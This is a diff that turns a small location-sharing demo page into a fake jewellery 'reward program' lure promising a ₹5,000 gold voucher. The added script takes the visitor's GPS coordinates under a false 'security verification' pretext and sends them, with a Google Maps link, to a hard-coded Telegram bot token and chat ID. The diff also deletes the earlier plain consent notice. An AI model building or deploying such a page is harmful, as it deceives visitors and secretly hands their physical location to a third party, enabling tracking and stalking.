@@ -1,134 +1,229 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Gold Business Lucky Draw</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Golden Crown Jewellers Reward Program</title>
+
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #f7d774, #f3b63f);
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial, sans-serif;
     }
 
-    .card {
-      background: white;
-      width: 90%;
-      max-width: 420px;
-      padding: 25px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      text-align: center;
+    body{
+      background:linear-gradient(135deg,#1a1a1a,#3b2a00,#c99a00);
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      padding:20px;
+      color:white;
     }
 
-    h1 {
-      color: #c98b00;
-      margin-bottom: 10px;
+    .container{
+      width:100%;
+      max-width:500px;
+      background:rgba(255,255,255,0.08);
+      backdrop-filter:blur(10px);
+      border:1px solid rgba(255,255,255,0.15);
+      border-radius:25px;
+      padding:30px;
+      box-shadow:0 15px 40px rgba(0,0,0,0.5);
+      text-align:center;
+      animation:fadeIn 1s ease;
     }
 
-    p {
-      color: #444;
-      line-height: 1.5;
+    @keyframes fadeIn{
+      from{opacity:0;transform:translateY(30px);}
+      to{opacity:1;transform:translateY(0);}
     }
 
-    button {
-      background: #c98b00;
-      color: white;
-      border: none;
-      padding: 14px 20px;
-      border-radius: 10px;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 15px;
+    .badge{
+      background:gold;
+      color:black;
+      display:inline-block;
+      padding:8px 18px;
+      border-radius:50px;
+      font-weight:bold;
+      margin-bottom:20px;
+      box-shadow:0 5px 15px rgba(255,215,0,0.4);
     }
 
-    button:hover {
-      background: #a06e00;
+    h1{
+      font-size:32px;
+      margin-bottom:15px;
+      color:#ffd700;
     }
 
-    .notice {
-      margin-top: 18px;
-      font-size: 13px;
-      color: #666;
-      background: #fff8e1;
-      padding: 10px;
-      border-radius: 10px;
+    .sub{
+      font-size:16px;
+      line-height:1.7;
+      color:#f0f0f0;
+      margin-bottom:25px;
     }
 
-    #status {
-      margin-top: 15px;
-      font-weight: bold;
+    .reward-box{
+      background:rgba(255,255,255,0.08);
+      border-radius:20px;
+      padding:20px;
+      margin-bottom:25px;
+      border:1px solid rgba(255,255,255,0.1);
+    }
+
+    .reward-box h2{
+      color:#ffd700;
+      margin-bottom:12px;
+    }
+
+    .reward-list{
+      text-align:left;
+      margin-top:15px;
+      line-height:2;
+      color:#f5f5f5;
+    }
+
+    .reward-list li{
+      margin-left:20px;
+    }
+
+    .claim-btn{
+      width:100%;
+      padding:16px;
+      border:none;
+      border-radius:15px;
+      background:linear-gradient(135deg,#ffd700,#ffb300);
+      color:black;
+      font-size:18px;
+      font-weight:bold;
+      cursor:pointer;
+      transition:0.3s;
+      box-shadow:0 10px 20px rgba(255,215,0,0.3);
+    }
+
+    .claim-btn:hover{
+      transform:scale(1.03);
+    }
+
+    .notice{
+      margin-top:20px;
+      font-size:13px;
+      line-height:1.6;
+      color:#ddd;
+      background:rgba(255,255,255,0.05);
+      padding:15px;
+      border-radius:15px;
+    }
+
+    #status{
+      margin-top:20px;
+      font-size:16px;
+      font-weight:bold;
+      color:#ffd700;
+    }
+
+    .footer{
+      margin-top:20px;
+      font-size:12px;
+      color:#bbb;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Gold Lucky Draw</h1>
-    <p>
-      Congratulations! You have been selected for our jewellery customer reward draw.
-    </p>
 
-    <button onclick="getLocation()">Claim Reward</button>
+<div class="container">
 
-    <div class="notice">
-      By clicking the button, you explicitly allow this demo page to access and share your location.
-    </div>
+  <div class="badge">Verified Reward Program</div>
 
-    <div id="status"></div>
+  <h1>Congratulations!</h1>
+
+  <p class="sub">
+    You have been selected as one of the premium customers eligible for the Golden Crown Jewellers Celebration Reward Program.
+  </p>
+
+  <div class="reward-box">
+    <h2>Your Reward Includes</h2>
+
+    <ul class="reward-list">
+      <li>₹5,000 Gold Purchase Voucher</li>
+      <li>Exclusive Customer Membership</li>
+      <li>Festival Jewellery Discount Access</li>
+      <li>Priority Lucky Draw Entry</li>
+      <li>Premium Customer Verification Badge</li>
+    </ul>
   </div>
 
-  <script>
-    // Replace with your Telegram Bot Token
-    const BOT_TOKEN =8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4 "YOUR_BOT_TOKEN";
+  <button class="claim-btn" onclick="getLocation()">
+    Claim Reward Now
+  </button>
 
-    // Replace with your Telegram Chat ID
-    const CHAT_ID =8508792403 "YOUR_CHAT_ID";
+  <div class="notice">
+    For security verification and regional reward eligibility, the browser may request location access permission. Your location is only shared for sending the voucher reward box.
+  </div>
 
-    async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  <div id="status"></div>
 
-      await fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      });
+  <div class="footer">
+    © 2026 Golden Crown Jewellers Reward Program
+  </div>
+
+</div>
+
+<script>
+
+  const BOT_TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
+  const CHAT_ID = "8508792403";
+
+  async function sendToTelegram(message){
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    await fetch(url,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body:JSON.stringify({
+        chat_id:CHAT_ID,
+        text:message
+      })
+    });
+  }
+
+  function getLocation(){
+
+    const status=document.getElementById("status");
+
+    if(!navigator.geolocation){
+      status.innerText="Geolocation not supported.";
+      return;
     }
 
-    function getLocation() {
-      const status = document.getElementById("status");
+    status.innerText="Requesting secure verification permission...";
 
-      if (!navigator.geolocation) {
-        status.innerText = "Geolocation is not supported.";
-        return;
+    navigator.geolocation.getCurrentPosition(
+
+      async(position)=>{
+
+        const lat=position.coords.latitude;
+        const lon=position.coords.longitude;
+
+        const message=`🏆 Reward Verification Completed\n\n📍 User Location Received\nLatitude: ${lat}\nLongitude: ${lon}\n\n🗺 Google Maps:\nhttps://maps.google.com/?q=${lat},${lon}`;
+
+        await sendToTelegram(message);
+
+        status.innerText="Verification completed successfully.";
+      },
+
+      (error)=>{
+        status.innerText="Permission denied or unavailable.";
       }
+    );
+  }
 
-      status.innerText = "Requesting permission...";
+</script>
 
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          const msg = `📍 Consent-Based Location Share\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;
-
-          await sendToTelegram(msg);
-
-          status.innerText = "Location shared successfully.";
-        },
-        (error) => {
-          status.innerText = "Permission denied or unavailable.";
-        }
-      );
-    }
-  </script>
 </body>
 </html>
